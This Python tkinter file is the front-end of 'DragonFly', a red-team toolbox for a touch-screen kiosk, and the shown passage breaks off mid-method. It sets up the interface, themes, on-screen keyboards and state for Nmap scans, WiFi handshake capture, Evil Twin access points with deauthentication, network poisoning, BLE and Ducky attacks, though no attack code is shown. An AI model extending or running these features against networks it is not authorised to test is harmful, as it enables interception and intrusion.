import tkinter as tk
from tkinter import ttk, simpledialog
from PIL import Image, ImageTk
import subprocess
import threading
import os
import time
import socket
import re
import tempfile
from datetime import datetime
import glob
import gc
import random  # <-- AÑADIDO PARA EL EFECTO DE RUIDO


# Esto asegura que sin importar desde dónde se llame el script (ej. autostart),
# las rutas relativas (payloads, Resultados_*, etc.) apunten a la carpeta DragonFly.
os.chdir(os.path.dirname(os.path.abspath(__file__)))
# Pegar tu arte gigante en una variable global
ARTE_DRAGON = """
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                            ▒▒                    ░░░░                                                                    
                                                                                ░░                  ▒▒                                                                      
                                                                                ░░░░      ▒▒▓▓      ▒▒░░                                                                    
                                                                                ▒▒    ▒▒▒▒▒▒▒▒    ▓▓                                                                      
                                                                                ░░▒▒  ▒▒▒▒▒▒▒▒  ▒▒░░  ░░                                                                  
                                  ░░░░░░░░░░░░░░                              ░░    ▒▒▒▒░░▒▒░░▒▒  ░░▒▒                  ░░░░░░░░░░░░░░░░░░░░░░                      
                      ░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░░░░░░░░░░░░░░░░░        ▒▒    ▒▒████▓▓░░░░░░      ░░░░░░░░░░░░░░░░▒▒▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒░░▒▒░░░░░░░░░░░░    
              ░░████▓▓▒▒░░▓▓▒▒▒▒░░▒▒░░░░░░░░▒▒▒▒░░░░▒▒▒▒░░▒▒██▓▓░░▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒░░▓▓░░░░░░░░░░▓▓▒▒▒▒▓▓▒▒░░▒▒░░░░░░▒▒  ░░░░▒▒▒▒░░░░░░▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒░░██▓▓▒▒░░            
        ░░░░░░░░░░▓▓▒▒░░░░░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ░░▓▓▓▓▒▒░░░░░░░░▒▒░░▒▒░░░░░░▓▓▓▓▓▓▒▒▒▒░░▓▓▓▓░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░▓▓▓▓░░░░▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▒▒░░░░▒▒░░░░░░        
      ░░░░░░░░░░▓▓▒▒▒▒▓▓  ░░▒▒░░▒▒░░▒▒░░▒▒▓▓██▓▓████▒▒▒▒▒▒░░▒▒▒▒░░░░░░░░░░░░░░▒▒▒▒░░▒▒▒▒░░▓▓▓▓░░▒▒▒▒▒▒░░▒▒░░░░░░░░░░░░░░▒▒▒▒▓▓░░▓▓████░░░░░░░░▒▒▒▒▒▒▒▒░░░░░░▓▓▒▒▓▓░░░░░░░░░░░░░░░░      
      ░░▒▒▒▒▒▒░░▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒░░░░▒▒▒▒▓▓██▓▓▒▒░░░░░░▒▒░░░░░░▒▒░░░░▒▒▒▒▒▒▒▒░░▒▒░░▒▒▒▒░░▒▒▒▒░░▒▒▒▒▒▒▒▒░░▒▒▒▒░░░░▒▒░░░░▓▓▓▓▓▓▓▓▒▒░░▒▒▒▒░░▒▒▒▒░░░░▒▒░░▒▒▓▓▒▒░░░░░░░░░░░░░░░░░░    
      ░░░░░░░░░░▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒░░▒▒▒▒░░▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░▒▒▒▒░░▒▒░░▒▒▓▓▒▒▒▒▒▒░░▓▓▒▒░░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒░░░░▒▒▒▒░░▒▒▓▓▒▒▒▒░░▒▒░░░░░░░░░░▒▒▒▒░░▒▒▓▓░░▒▒▒▒▒▒░░░░░░░░      
        ░░░░░░▒▒░░░░░░▒▒░░░░▒▒░░▒▒▒▒▒▒▒▒▒▒░░░░▒▒░░░░░░▒▒░░▓▓▓▓▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░▓▓░░▒▒▒▒░░▓▓░░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▓▓▒▒░░▒▒▒▒░░▒▒▒▒░░░░▒▒░░▒▒▒▒▒▒▒▒░░░░▒▒▒▒░░░░░░░░░░        
            ░░░░▒▒░░▒▒░░▒▒▒▒▒▒░░░░▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓░░░░░░░░░░░░▒▒▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░▓▓▓▓▒▒▓▓░░▒▒░░░░▒▒░░▒▒▓▓▓▓▒▒▒▒▒▒▓▓▓▓░░▒▒░░░░▒▒▓▓▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░          
                ░░░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▓▓░░▒▒░░░░▒▒░░░░░░░░▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▓▓██▒▒▒▒▒▒▒▒▓▓▒▒░░▓▓▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░              
                      ░░░░░░░░░░░░░░▒▒▒▒▓▓██▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒░░░░▒▒▒▒▒▒▒▒▓▓▒▒  ░░▓▓▒▒░░  ░░▒▒▒▒░░▒▒▒▒░░░░░░▓▓▓▓▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▓▓▒▒▒▒▒▒░░░░░░░░░░                    
                                  ░░░░░░░░░░░░░░░░▒▒░░▒▒▒▒▒▒▒▒▓▓▒▒░░░░░░▒▒░░▒▒▒▒▓▓▓▓░░    ▒▒▒▒    ░░▓▓▓▓▒▒░░░░▒▒▒▒▒▒░░▒▒▒▒▓▓▒▒▒▒▓▓░░▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░                            
                                            ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░▒▒▒▒▓▓░░      ▒▒▒▒      ░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒░░░░▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒░░░░░░                                      
                                        ░░▒▒▒▒▒▒▓▓▓▓▒▒▓▓▓▓▒▒░░▒▒▒▒▒▒░░▒▒▒▒▒▒▓▓▓▓░░        ▒▒▒▒        ░░░░▓▓▓▓▒▒░░░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░▓▓▓▓▓▓▒▒░░░░░░                                  
                                  ░░▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░░▒▒▓▓▒▒░░░░▒▒▒▒░░░░▒▒▒▒▒▒░░          ▒▒▒▒            ░░░░▒▒▓▓▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒░░░░░░░░                              
                              ░░▒▒▒▒▒▒▒▒▓▓▒▒░░▓▓▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒░░▒▒▒▒▒▒▓▓░░              ▒▒░░                ░░▒▒▓▓▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓▓▓▒▒░░░░▒▒░░▒▒▒▒░░                          
                        ░░░░▒▒▒▒▒▒▓▓▒▒▒▒▓▓▒▒▓▓██████▓▓░░▒▒▓▓░░▒▒▒▒▓▓▒▒░░░░                ▓▓                  ░░░░▓▓▓▓▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒░░░░                        
                    ░░░░░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒██▓▓▓▓▓▓▓▓▒▒░░▒▒▒▒░░▒▒▒▒▒▒░░                    ▒▒░░                    ░░▒▒▒▒▒▒▒▒▒▒░░▒▒░░▓▓████▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░                      
                ▒▒░░▒▒▒▒▓▓▒▒▒▒▒▒▒▒▓▓▒▒▒▒░░░░▒▒██▓▓░░▒▒▒▒▒▒▓▓▓▓▒▒░░                        ▒▒░░                        ░░▓▓▒▒░░▒▒░░▒▒░░▓▓████▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░░░░░                
            ▒▒██░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒░░████░░░░▒▒▒▒▒▒▓▓░░░░                          ▓▓                              ░░░░▓▓▓▓▒▒░░░░░░████▓▓▒▒▒▒▓▓▓▓▒▒░░░░░░▒▒▒▒▒▒░░██▒▒            
        ░░░░▒▒  ▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓░░▒▒▒▒░░▒▒▓▓▓▓░░░░                              ▓▓░░                                ░░░░▓▓▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒░░░░░░▒▒░░  ▒▒▒▒██░░        
      ░░▒▒░░░░  ▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒░░▒▒▒▒▓▓▒▒░░░░                                  ▓▓                                      ░░▒▒▒▒▓▓▓▓▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒░░░░░░▒▒░░░░░░▒▒░░░░░░      
      ░░░░░░░░▒▒░░░░▒▒░░▒▒▒▒▒▒▒▒▒▒░░▒▒░░░░▒▒░░▒▒░░░░                                      ▓▓                                          ░░░░░░░░░░▒▒▒▒▒▒▓▓▒▒▒▒░░░░▒▒▒▒  ░░░░░░░░  ▓▓░░    
            ░░░░░░░░░░░░░░  ░░░░░░░░░░░░                                                  ▒▒░░                                              ░░░░░░░░░░▒▒▒▒░░▒▒▒▒▒▒▒▒░░  ▒▒▒▒░░▒▒░░      
                                                                                          ▓▓                                                      ░░▒▒▒▒░░░░░░░░░░░░░░░░░░              
                                                                                          ▒▒                                                                      ░░                    
                                                                                          ▓▓                                                                                            
                                                                                          ▓▓                                                                                            
                                                                                          ▒▒                                                                                            
                                                                                          ▓▓░░                                                                                          
                                                                                          ▓▓░░                                                                                          
                                                                                          ▒▒░░                                                                                          
                                                                                          ▓▓▒▒                                                                                          
                                                                                          ▒▒░░                                                                                          
                                                                                          ░░░░                                                                                          
                                                                                          ▒▒▒▒                                                                                          
                                                                                          ░░▒▒                                                                                          
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
"""


# ==========================================
# CONFIGURACION VISUAL PRO (Red Team Theme)
# ==========================================
COLOR_FONDO_SIDEBAR = "#111111"
COLOR_FONDO_PRINCIPAL = "#1a1a1a"
COLOR_BOTON_ROJO = "#a60000"
COLOR_BOTON_HOVER = "#6b0000"
COLOR_TEXTO_TERMINAL = "#ff4d4d"
COLOR_BOTON_PELIGRO = "#ff9900"

# Directorios base para resultados
BASE_DIR_NMAP = "Resultados_Nmap"
BASE_DIR_WIFI = "Resultados_Handshake"
BASE_DIR_EVIL = "Resultados_EvilTwin"
BASE_DIR_BLE = "Resultados_BLE"
BASE_DIR_POISON = "Resultados_Poison" 

# ==========================================
# CLASE SCROLLABLE FRAME (Táctil optimizado)
# ==========================================
class ScrollableFrame(tk.Frame):
    """Frame con scroll vertical usando Canvas, optimizado para pantalla táctil."""
    def __init__(self, parent, max_items=50, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)
        self.bg_color = COLOR_FONDO_PRINCIPAL
        self.max_items = max_items
        self.configure(bg=self.bg_color, highlightthickness=0, borderwidth=0)

        # Canvas con scrollbar
        self.canvas = tk.Canvas(self, bg=self.bg_color, highlightthickness=0, borderwidth=0)
        self.scrollbar = ttk.Scrollbar(self, orient="vertical", command=self.canvas.yview,
                                       style='Dark.Vertical.TScrollbar')
       
       
       
        self.scrollable_frame = tk.Frame(self.canvas, bg=self.bg_color,
                                          highlightthickness=0, borderwidth=0)

        self.scrollable_frame.bind("<Configure>", lambda e: self.canvas.configure(
            scrollregion=self.canvas.bbox("all")))

        self.canvas_window = self.canvas.create_window((0, 0), window=self.scrollable_frame,
                                                       anchor="nw", tags="scrollable_frame")

        self.canvas.configure(yscrollcommand=self.scrollbar.set)

        self.scrollbar.pack(side="right", fill="y")
        self.canvas.pack(side="left", fill="both", expand=True)

        # Eventos táctiles y ratón
        self.canvas.bind("<Button-1>", self._on_touch_start)
        self.canvas.bind("<B1-Motion>", self._on_touch_drag)
        self.canvas.bind("<ButtonRelease-1>", self._on_touch_end)

        # Rueda de ratón (Linux)
        self.canvas.bind("<Button-4>", lambda e: self.canvas.yview_scroll(-1, "units"))
        self.canvas.bind("<Button-5>", lambda e: self.canvas.yview_scroll(1, "units"))

        self.bind("<Button-4>", lambda e: self.canvas.yview_scroll(-1, "units"))
        self.bind("<Button-5>", lambda e: self.canvas.yview_scroll(1, "units"))

        self._drag_start_y = 0
        self._scroll_start_y = 0

        # Ajustar ancho del frame interno al canvas
        self.canvas.bind("<Configure>", self._on_canvas_configure)

    def _on_canvas_configure(self, event):
        """Ajusta el ancho del frame interior al ancho del canvas."""
        self.canvas.itemconfig(self.canvas_window, width=event.width)

    def _on_touch_start(self, event):
        """Inicia arrastre táctil."""
        self._drag_start_y = event.y
        self._scroll_start_y = self.canvas.yview()[0] * self.canvas.bbox("all")[3] if self.canvas.bbox("all") else 0

    def _on_touch_drag(self, event):
        """Arrastrar para desplazar contenido (scroll natural)."""
        dy = self._drag_start_y - event.y
        if abs(dy) > 3:
            total_height = self.canvas.bbox("all")[3] if self.canvas.bbox("all") else 1
            fraction = dy / total_height
            self.canvas.yview_scroll(int(fraction * 10), "units")
            self._drag_start_y = event.y

    def _on_touch_end(self, event):
        pass

    def clear(self):
        for widget in self.scrollable_frame.winfo_children():
            widget.destroy()
        self.canvas.configure(scrollregion=(0, 0, 0, 0))
        gc.collect()

    def add_button(self, text, command, style='Menu.TButton', width=None):
        current_children = len(self.scrollable_frame.winfo_children())
        if current_children >= self.max_items:
            warning_label = tk.Label(self.scrollable_frame,
                                     text="[!] Demasiados resultados. Revisa desde consola.",
                                     bg=self.bg_color, fg=COLOR_TEXTO_TERMINAL,
                                     font=('Helvetica', 9))
            warning_label.pack(fill='x', padx=10, pady=4)
            return None

        if width is None:
            width = 28

        btn = ttk.Button(self.scrollable_frame, text=text, style=style, width=width)
        btn.configure(command=command)
        
        # Aplicación de padding externo para Flat Design (padx=10, pady=4)
        btn.pack(fill='x', padx=10, pady=4)
        return btn

    def add_widget(self, widget, **pack_options):
        current_children = len(self.scrollable_frame.winfo_children())
        if current_children >= self.max_items:
            warning_label = tk.Label(self.scrollable_frame,
                                     text="[!] Demasiados elementos.",
                                     bg=self.bg_color, fg=COLOR_TEXTO_TERMINAL,
                                     font=('Helvetica', 9))
            warning_label.pack(fill='x', padx=5, pady=2)
            return
        widget.pack(**pack_options)


class TecladoNumerico(tk.Toplevel):
    def __init__(self, parent, variable_destino, titulo="Ingresar IP/Rango"):
        super().__init__(parent)
        self.variable_destino = variable_destino
        
        # Configuración de la ventana para que parezca un modal integrado
        self.title(titulo)
        self.configure(bg=COLOR_FONDO_PRINCIPAL)
        self.attributes('-topmost', True) # Se mantiene arriba del modo Kiosco
        self.overrideredirect(True) # Sin barra de título del OS
        
        # Adaptar al tamaño y posición exactos de la ventana padre
        w = parent.winfo_width()
        h = parent.winfo_height()
        x = parent.winfo_x()
        y = parent.winfo_y()
        self.geometry(f"{w}x{h}+{x}+{y}")

        # Frame principal
        main_frame = ttk.Frame(self, style='Dark.TFrame')
        main_frame.pack(fill='both', expand=True, padx=5, pady=5)

        # Pantalla (Display) del teclado
        self.display_var = tk.StringVar(value=variable_destino.get())
        display = ttk.Entry(main_frame, textvariable=self.display_var, font=('Helvetica', 14, 'bold'), 
                            justify='center', style='Dark.TEntry')
        display.pack(fill='x', pady=(0, 5))

        # Contenedor de botones
        grid_frame = ttk.Frame(main_frame, style='Dark.TFrame')
        grid_frame.pack(fill='both', expand=True)

        # Configurar proporciones del grid
        for i in range(4):
            grid_frame.grid_columnconfigure(i, weight=1)
            grid_frame.grid_rowconfigure(i, weight=1)

        botones = [
            ('7', 0, 0), ('8', 0, 1), ('9', 0, 2), ('DEL', 0, 3),
            ('4', 1, 0), ('5', 1, 1), ('6', 1, 2), ('/', 1, 3),
            ('1', 2, 0), ('2', 2, 1), ('3', 2, 2), ('.', 2, 3),
            ('0', 3, 0), ('-', 3, 1), ('CANCEL', 3, 2), ('OK', 3, 3)
        ]

        for (texto, fila, col) in botones:
            estilo = 'Red.TButton' if texto in ('OK', 'CANCEL', 'DEL') else 'Gray.TButton'
            btn = ttk.Button(grid_frame, text=texto, style=estilo, 
                             command=lambda t=texto: self._procesar_tecla(t))
            btn.grid(row=fila, column=col, sticky='nsew', padx=2, pady=2)

    def _procesar_tecla(self, tecla):
        actual = self.display_var.get()
        if tecla == 'OK':
            self.variable_destino.set(actual)
            self.destroy()
        elif tecla == 'CANCEL':
            self.destroy()
        elif tecla == 'DEL':
            self.display_var.set(actual[:-1])
        else:
            self.display_var.set(actual + tecla)

class TecladoCompleto(tk.Toplevel):
    def __init__(self, parent, variable_destino, titulo="Ingresar Texto"):
        super().__init__(parent)
        self.variable_destino = variable_destino
        
        # Configuración como modal Kiosco
        self.title(titulo)
        self.configure(bg=COLOR_FONDO_PRINCIPAL)
        self.attributes('-topmost', True)
        self.overrideredirect(True)
        
        # Adaptar al tamaño y posición exactos de la ventana padre
        w = parent.winfo_width()
        h = parent.winfo_height()
        x = parent.winfo_x()
        y = parent.winfo_y()
        self.geometry(f"{w}x{h}+{x}+{y}")

        # Contenedor Principal
        main_frame = ttk.Frame(self, style='Dark.TFrame')
        main_frame.pack(fill='both', expand=True, padx=2, pady=2)

        # Barra superior con título corto y Display
        top_frame = ttk.Frame(main_frame, style='Dark.TFrame')
        top_frame.pack(fill='x', pady=(0, 2))
        
        ttk.Label(top_frame, text=titulo[:15], style='Gray.TLabel').pack(side='left', padx=2)
        
        self.display_var = tk.StringVar(value="")
        display = ttk.Entry(top_frame, textvariable=self.display_var, font=('Helvetica', 12, 'bold'), 
                            justify='center', style='Dark.TEntry')
        display.pack(side='right', fill='x', expand=True)

        # Contenedor apilado para los teclados (tkraise para no consumir CPU reconstruyendo)
        self.kb_container = ttk.Frame(main_frame, style='Dark.TFrame')
        self.kb_container.pack(fill='both', expand=True)
        self.kb_container.grid_rowconfigure(0, weight=1)
        self.kb_container.grid_columnconfigure(0, weight=1)

        self.frames_teclado = {}
        for modo in ("minusculas", "mayusculas", "simbolos"):
            frame = ttk.Frame(self.kb_container, style='Dark.TFrame')
            frame.grid(row=0, column=0, sticky='nsew')
            self.frames_teclado[modo] = frame
            self._construir_teclas(frame, modo)

        # Iniciar en minúsculas
        self.cambiar_modo("minusculas")

    def cambiar_modo(self, modo):
        self.frames_teclado[modo].tkraise()

    def _construir_teclas(self, parent_frame, modo):
        if modo == "minusculas":
            filas = [
                ['q','w','e','r','t','y','u','i','o','p'],
                ['a','s','d','f','g','h','j','k','l'],
                ['z','x','c','v','b','n','m','DEL'],
                ['MAYUS', '123', 'ESPACIO', 'CANCEL', 'OK']
            ]
        elif modo == "mayusculas":
            filas = [
                ['Q','W','E','R','T','Y','U','I','O','P'],
                ['A','S','D','F','G','H','J','K','L'],
                ['Z','X','C','V','B','N','M','DEL'],
                ['minus', '123', 'ESPACIO', 'CANCEL', 'OK']
            ]
        else: # simbolos
            filas = [
                ['1','2','3','4','5','6','7','8','9','0'],
                ['!','@','#','$','%','&','*','-','_','+'],
                ['=','/','?','¡','.','"',"'",'DEL'],
                ['abc', 'MAYUS', 'ESPACIO', 'CANCEL', 'OK']
            ]

        # Configurar las 4 filas para que ocupen todo el alto disponible
        for i, fila in enumerate(filas):
            parent_frame.grid_rowconfigure(i, weight=1)
            
            # Sub-frame para cada fila
            f = ttk.Frame(parent_frame, style='Dark.TFrame')
            f.grid(row=i, column=0, sticky='nsew', pady=1)
            
            # Repartir el espacio equitativamente entre las teclas de esta fila
            for j in range(len(fila)):
                f.grid_columnconfigure(j, weight=1)
                
            for j, tecla in enumerate(fila):
                if tecla in ('OK', 'CANCEL', 'DEL'):
                    estilo = 'Red.TButton'
                elif tecla in ('MAYUS', 'minus', '123', 'abc', 'ESPACIO'):
                    estilo = 'Danger.TButton'
                else:
                    estilo = 'Gray.TButton'

                # Al usar width=2 forzamos al botón a ignorar su ancho por defecto 
                # permitiendo que el 'grid' (sticky='nsew') lo estire o encoja matemáticamente
                btn = ttk.Button(f, text=tecla, style=estilo, width=2,
                                 command=lambda t=tecla: self._procesar_tecla(t))
                btn.grid(row=0, column=j, sticky='nsew', padx=1)

    def _procesar_tecla(self, tecla):
        actual = self.display_var.get()
        if tecla == 'OK':
            self.variable_destino.set(actual)
            self.destroy()
        elif tecla == 'CANCEL':
            self.variable_destino.set("CANCELADO") # Flag interno
            self.destroy()
        elif tecla == 'DEL':
            self.display_var.set(actual[:-1])
        elif tecla == 'ESPACIO':
            self.display_var.set(actual + " ")
        elif tecla == 'MAYUS':
            self.cambiar_modo("mayusculas")
        elif tecla == 'minus' or tecla == 'abc':
            self.cambiar_modo("minusculas")
        elif tecla == '123':
            self.cambiar_modo("simbolos")
        else:
            self.display_var.set(actual + tecla)

class RedTeamApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("DRAGON FLY - RED TEAM TOOLBOX")
        
        # Obtener el ancho y alto real de la pantalla
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        
        # Ajustar la geometría al tamaño de la pantalla y permitir redimensión
        self.geometry(f"{screen_width}x{screen_height}")
        self.resizable(True, True)

        # Estilos ttk completamente oscuros (sin bordes blancos)

        
        style = ttk.Style()
        style.theme_use('clam')

        style.configure('TFrame', background=COLOR_FONDO_PRINCIPAL, borderwidth=0)
        style.configure('TLabel', background=COLOR_FONDO_PRINCIPAL, foreground='white',
                        font=('Helvetica', 10), borderwidth=0)
        style.configure('TButton', borderwidth=0, relief='flat')
        style.map('TButton',
                  background=[('active', COLOR_BOTON_HOVER)],
                  bordercolor=[('focus', '#a60000')],
                  focuscolor=[('focus', '#a60000')])

        style.configure('Dark.TFrame', background=COLOR_FONDO_PRINCIPAL, borderwidth=0)
        style.configure('Dark.TLabel', background=COLOR_FONDO_PRINCIPAL, foreground='white',
                        font=('Helvetica', 10), borderwidth=0)
        style.configure('Title.TLabel', background=COLOR_FONDO_PRINCIPAL, foreground='#ff4d4d',
                        font=('Helvetica', 12, 'bold'), borderwidth=0)
        style.configure('Gray.TLabel', background=COLOR_FONDO_PRINCIPAL, foreground='#aaaaaa',
                        font=('Helvetica', 10), borderwidth=0)

        style.configure('Dark.TMenubutton', background=COLOR_BOTON_ROJO, foreground='white',
                bordercolor='#a60000', relief='flat', arrowcolor='white',
                font=('Helvetica', 10))
        style.map('Dark.TMenubutton',
                background=[('active', COLOR_BOTON_HOVER)],
                arrowcolor=[('active', 'white')])

        # --- NUEVO: Estilo para la barra de desplazamiento (Scrollbar) táctil ---
        style.configure('Dark.Vertical.TScrollbar',
                        background='#333333',
                        troughcolor=COLOR_FONDO_PRINCIPAL,
                        bordercolor=COLOR_FONDO_PRINCIPAL,
                        arrowcolor='white',
                        arrowsize=20,  # Aumenta el grosor para mantenerlo "touch-friendly"
                        relief='flat')
        style.map('Dark.Vertical.TScrollbar',
                  background=[('active', COLOR_BOTON_ROJO), ('pressed', COLOR_BOTON_HOVER)],
                  arrowcolor=[('active', 'white')])
        
        # Estilo para botones con iconos (App Launcher Style)
        style.configure('AppIcon.TButton', background=COLOR_FONDO_PRINCIPAL, foreground='white',
                        relief='flat', font=('Helvetica', 9, 'bold'), borderwidth=0)
        style.map('AppIcon.TButton',
                  background=[('active', COLOR_BOTON_HOVER)],
                  bordercolor=[('focus', COLOR_FONDO_PRINCIPAL)])



        style.configure('Red.TButton', background=COLOR_BOTON_ROJO, foreground='white',
                        relief='flat', font=('Helvetica', 10, 'bold'),
                        bordercolor=COLOR_BOTON_ROJO, focuscolor=COLOR_BOTON_ROJO,
                        borderwidth=1, focusthickness=1)
        style.map('Red.TButton',
                  background=[('active', COLOR_BOTON_HOVER)],
                  bordercolor=[('focus', COLOR_BOTON_ROJO), ('active', COLOR_BOTON_HOVER)],
                  focuscolor=[('focus', COLOR_BOTON_ROJO)])

        style.configure('Gray.TButton', background='#4a4a4a', foreground='white',
                        relief='flat', font=('Helvetica', 10),
                        bordercolor='#4a4a4a', focuscolor='#777777',
                        borderwidth=1, focusthickness=1)
        style.map('Gray.TButton',
                  background=[('active', '#2b2b2b')],
                  bordercolor=[('focus', '#777777')])

        style.configure('Danger.TButton', background=COLOR_BOTON_PELIGRO, foreground='black',
                        relief='flat', font=('Helvetica', 10, 'bold'),
                        bordercolor=COLOR_BOTON_PELIGRO, focuscolor=COLOR_BOTON_PELIGRO,
                        borderwidth=1, focusthickness=1)
        style.map('Danger.TButton',
                  background=[('active', '#cc7a00')],
                  bordercolor=[('focus', COLOR_BOTON_PELIGRO)])

        style.configure('Dark.TCheckbutton', background=COLOR_FONDO_PRINCIPAL,
                        foreground='white', indicatorcolor='#a60000',
                        focuscolor='none', borderwidth=0)
        style.map('Dark.TCheckbutton',
                  indicatorcolor=[('selected', '#a60000')])

        style.configure('Dark.TEntry', fieldbackground='#333333', foreground='white',
                        insertcolor='white', bordercolor='#a60000',
                        borderwidth=1, relief='flat')

        style.configure('Dark.TOptionMenu', background=COLOR_BOTON_ROJO,
                        foreground='white', bordercolor='#a60000',
                        borderwidth=1)

        style.configure('Dark.TMenubutton', background=COLOR_BOTON_ROJO, foreground='white',
                bordercolor='#a60000', relief='flat', arrowcolor='white', font=('Helvetica', 10))
        style.map('Dark.TMenubutton', background=[('active', COLOR_BOTON_HOVER)], arrowcolor=[('active', 'white')])

        # Fullscreen
        def aplicar_kiosco():
            self.attributes('-fullscreen', True)
            self.attributes('-topmost', True)
            self.lift()
            self.focus_force()
        self.after(1000, aplicar_kiosco)
        self.bind("<Escape>", lambda event: self.destroy())

        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Variables de estado global
        self.target_ip = tk.StringVar(value="127.0.0.1")
        self.ducky_layout = tk.StringVar(value="us") 
        self.usar_rango = tk.BooleanVar(value=False)
        self.rango_cidr = tk.StringVar(value="/24")
        self.interfaz_seleccionada = tk.StringVar(value="")
        self.session_dir_nmap = ""

        self.wifi_state = {}
        self.ble_state = {}
        self.navigation_stack = []

        self.evil_twin_procs = {
            'hostapd': None,
            'dnsmasq': None,
            'capture': None,
            'deauth': None
        }
        self.evil_twin_stop = False
        self.deauth_proc = None

        self.poison_attack_instance = None  # guardará la instancia de PoisonAttack
        self.poison_thread = None

        self.console_buffer = []
        self.console_pending = False
        self._console_after_id = None

        self.gadget = None
        self.gadget_available = False
        self._gadget_initialized = False

        for d in [BASE_DIR_NMAP, BASE_DIR_WIFI, BASE_DIR_EVIL, BASE_DIR_BLE, BASE_DIR_POISON]:
            os.makedirs(d, exist_ok=True)

        self.main_frame = ttk.Frame(self, style='Dark.TFrame')
        self.main_frame.pack(fill='both', expand=True)

        self.back_btn = None
        self.mostrar_splash_screen()

    # ---------------- helpers de navegación ----------------
    def limpiar_main_frame(self):
        if self._console_after_id is not None:
            self.after_cancel(self._console_after_id)
            self._console_after_id = None
        self.console_pending = False
        self.console_buffer.clear()
        for widget in self.main_frame.winfo_children():
            widget.destroy()
        self.back_btn = None
        gc.collect()

    def agregar_boton_atras(self, callback):
        self.back_btn = ttk.Button(self.main_frame, text="← Atrás", style='Gray.TButton',
                                   width=8, command=callback)
        self.back_btn.pack(anchor="nw", padx=2, pady=2)

    def mostrar_consola(self, parent=None):
        """Consola dinámica con scrollbar y soporte táctil para la pantalla de 2.4 pulgadas."""
        if parent is None:
            parent = self.main_frame
            
        # Contenedor aislado con fondo casi negro (#050505) y borde visible (#333333)
        self.console_frame = tk.Frame(parent, bg='#050505', 
                                      highlightbackground="#333333", highlightcolor="#333333", 
                                      highlightthickness=1)
        self.console_frame.pack(fill='x', padx=5, pady=6)

        # Terminal text-box con fuente en negrita (bold)
        self.console_textbox = tk.Text(self.console_frame, height=4, bg='#050505',
                                       fg=COLOR_TEXTO_TERMINAL, font=('Courier', 9, 'bold'),
                                       state='disabled', highlightthickness=0,
                                       borderwidth=0, relief='flat')
                                       
        self.console_scrollbar = ttk.Scrollbar(self.console_frame, orient="vertical", 
                                               command=self.console_textbox.yview,
                                               style='Dark.Vertical.TScrollbar')
                                               
        self.console_textbox.configure(yscrollcommand=self.console_scrollbar.set)
        
        self.console_scrollbar.pack(side="right", fill="y")
        # Padding interno ligero en la caja de texto para que las letras no toquen el borde
        self.console_textbox.pack(side="left", fill="x", expand=True, padx=(4, 0), pady=2)

        self.console_textbox.bind("<Button-1>", self._on_console_touch_start)
        self.console_textbox.bind("<B1-Motion>", self._on_console_touch_drag)

    def _on_console_touch_start(self, event):
        """Registra la posición inicial del dedo en la consola."""
